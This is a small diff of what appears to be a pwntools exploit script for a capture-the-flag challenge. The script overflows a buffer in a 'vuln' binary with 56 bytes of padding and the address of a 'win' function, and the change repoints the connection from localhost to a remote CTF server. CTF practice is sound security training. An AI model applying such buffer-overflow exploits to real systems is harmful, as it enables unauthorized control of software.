@@ -12,7 +12,7 @@ def main():
     vuln = ELF("vuln")
     payload = cyclic(56) + struct.pack("<Q", vuln.functions.win.address)
 
-    conn = remote("localhost", 1337)
+    conn = remote("ctf.dscmunich.de", 10001)
     conn.recvuntil(b"How many characters will your message have?\n")
     conn.send(f"{len(payload)}\n".encode())
     conn.recvline()
